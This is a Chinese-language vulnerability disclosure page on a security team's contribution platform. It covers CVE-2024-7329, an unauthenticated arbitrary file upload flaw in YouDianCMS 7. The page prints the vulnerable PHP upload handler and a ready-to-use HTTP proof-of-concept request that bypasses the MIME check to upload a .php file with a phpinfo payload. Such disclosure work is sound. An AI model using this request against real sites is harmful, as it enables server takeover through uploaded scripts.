
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】（CVE-2024-7329）YouDianCMS 7 任意文件上传漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】（CVE-2024-7329）YouDianCMS 7 任意文件上传漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-07-21 23:02:21</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/607/" class="am-link-muted">Mstir</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-warning">高危</span></td>
                  <td class="am-text-center am-hide-sm-down">0</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-7329<br>Created: 07/31/2024 02:19 PM<br>Updated: 08/01/2024 01:20 PM<br>Changes: 07/31/2024 02:19 PM (55), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)<br>Submitter: Mstir@Wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<blockquote>
<p>YouDianCMS（友点企业网站管理系统）是一个集PC站、手机站、微网站、多端小程序（微信、百度、抖音/头条、支付宝、QQ、360小程序）、APP于一体的企业建站解决方案。</p>
</blockquote>
<p>YouDianCMS 7版本的前台 存在 任意文件上传漏洞。攻击者可以绕过MIME类型检查，上传恶意的PHP文件到服务器。由于系统未对上传文件进行有效的类型验证，攻击者可以利用这一漏洞上传并执行服务器端脚本，从而获取服务器的控制权限。</p>
<h1>审计过程</h1>
<p>定位到了一处文件上传点:</p>
<pre class="codehilite"><code class="language-php">&lt;?php
 define ( &#039;IN_BAMBOO&#039;, true );
 // 取得根目录
define ( &#039;ROOT_PATH&#039;, &#039;../../../../&#039; );  // back to your root path

$arrType = array (
        &#039;image/jpg&#039;,
        &#039;image/gif&#039;,
        &#039;image/png&#039;,
        &#039;image/bmp&#039;,
        &#039;image/pjpeg&#039;,
        &#039;image/jpeg&#039; 
);
$max_size = 500 * 1024; // 最大文件限制（单位：byte）
$upfile = ROOT_PATH.&#039;image/uploads&#039;; // 图片目录路径
if (!isset($_FILES [&#039;files&#039;])){
    echo &#039;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;未能找到图片，请确认图片是否过大&quot;}&#039;;
    exit ();
}
$file = $_FILES [&#039;files&#039;];

if ($_SERVER [&#039;REQUEST_METHOD&#039;] == &#039;POST&#039;) { // 判断提交方式是否为POST
    if (! is_uploaded_file ( $file [&#039;tmp_name&#039;] )) { // 判断上传文件是否存在
        echo &#039;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;图片不存在&quot;}&#039;;
        exit ();
    }

    if ($file [&#039;size&#039;] &gt; $max_size) { // 判断文件大小是否大于500000字节
        echo &#039;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片太大，最大支持：&#039;.($max_size/1024).&#039;KB&quot;}&#039;;
        exit ();
    }
    if (! in_array ( $file [&#039;type&#039;], $arrType )) { // 判断图片文件的格式
        echo &#039;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片格式不对&quot;}&#039;;
        exit ();
    }
    if (! file_exists ( $upfile )) { // 判断存放文件目录是否存在
        mkdir ( $upfile, 0755, true );
    }
    $imageSize = getimagesize ( $file [&#039;tmp_name&#039;] );
    $img = $imageSize [0] . &#039;*&#039; . $imageSize [1];
    $fname = $file [&#039;name&#039;];
    $ftype = explode ( &#039;.&#039;, $fname );
    $time = explode ( &quot; &quot;, microtime () );
    $time = $time [1] . ($time [0] * 1000);
    $time2 = explode ( &quot;.&quot;, $time );  
    $time = $time2 [0];
    $returnName=$time.&quot;.&quot; .end($ftype);
    $picName = $upfile . &quot;/&quot; . $returnName ;

    if (! move_uploaded_file ( $file [&#039;tmp_name&#039;], $picName )) {
        echo &#039;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;从:&#039;.$file [&#039;tmp_name&#039;].&#039;移动图片到:&#039;.$picName.&#039;出错&quot;}&#039;;
        exit ();
    } else {
        echo &#039;{&quot;result&quot;:&quot;200&quot;,&quot;imgurl&quot;:&quot;image/uploads/&#039; . $returnName . &#039;&quot;}&#039;;
    }
}

?&gt;
</code></pre>

<p>发现并未有鉴权 只需绕过MIME头即可上传php文件.</p>
<p><img alt="null" src="/media/images/2024/07/21/1ef41508-e4a7-47c3-bbc1-204f4a2ac38c-LVEusH9i.png" /></p>
<h1>POC</h1>
<pre class="codehilite"><code class="language-http">POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: x.x.x.x
Content-Length: 202
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.3611
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Connection: close

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;c1.jpg.php&quot;
Content-Type: image/jpg

&lt;?php phpinfo();?&gt;
------WebKitFormBoundarydAPjrmyKewWuf59H--
</code></pre>
          </div>

          


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>